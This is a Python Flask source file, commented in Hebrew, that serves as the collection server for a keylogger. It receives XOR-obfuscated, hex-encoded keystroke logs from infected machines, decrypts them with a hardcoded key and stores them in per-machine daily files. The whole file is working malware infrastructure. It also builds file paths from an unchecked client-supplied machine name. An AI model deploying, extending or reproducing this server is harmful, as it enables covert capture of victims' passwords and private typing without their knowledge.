# -*- coding: utf-8 -*-

from flask import Flask, jsonify, request
import os
import time
import codecs

app = Flask(__name__)

# הגדרת נתיב תיקיית הנתונים
DATA_FOLDER = "data"

# הגדרת המפתח הסודי לפענוח
# הערה: ביישום אמיתי, מפתח זה צריך להיות מאוחסן בצורה מאובטחת יותר.
SECRET_KEY = "avi"


def xor_decrypt_bytes(data: bytes, key: str) -> bytes:
    """פענוח XOR על רצף בייטים"""
    key_bytes = key.encode("utf-8")
    decrypted = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
    return decrypted


@app.route('/')
def home():
    return "KeyLogger Server is Running"


@app.route('/api/upload', methods=['POST'])
def upload():
    """
    מקבל נתונים מוצפנים מהקיילוגר, מפענח אותם ושומר בקובץ.
    """
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    encrypted_hex_data = data["data"]

    # --- שלב הפענוח החדש ---
    try:
        # 1. המרת מחרוזת Hex לבייטים
        encrypted_data_bytes = codecs.decode(encrypted_hex_data.encode("utf-8"), 'hex')

        # 2. פענוח הבייטים באמצעות פונקציית XOR
        decrypted_data_bytes = xor_decrypt_bytes(encrypted_data_bytes, SECRET_KEY)

        # 3. המרת הבייטים המפוענחים בחזרה למחרוזת טקסט קריאה
        log_data = decrypted_data_bytes.decode("utf-8", errors="ignore")

    except Exception as e:
        # טיפול בשגיאה אם הפענוח נכשל
        return jsonify({"error": f"Decryption failed: {str(e)}"}), 500

    # יצירת תיקייה למכונה אם היא לא קיימת
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    # שימוש בשם קובץ קבוע לכל מכונה המבוסס על התאריך
    date_str = time.strftime("%Y-%m-%d")
    filename = f"log_{date_str}.txt"
    file_path = os.path.join(machine_folder, filename)

    # הוספת חותמת זמן ושורה חדשה לכל שליחה
    timestamp = time.strftime("[%Y-%m-%d %H:%M:%S]")
    line_to_write = f"{timestamp} - {log_data}\n"

    # פתיחת הקובץ במצב הוספה ('a'). אם הקובץ לא קיים הוא יווצר
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(line_to_write)

    return jsonify({"status": "success", "file": file_path}), 200


if __name__ == '__main__':
    # יצירת תיקיית הנתונים אם היא לא קיימת בעת הפעלת השרת
    if not os.path.exists(DATA_FOLDER):
        os.makedirs(DATA_FOLDER)
    app.run(debug=True)
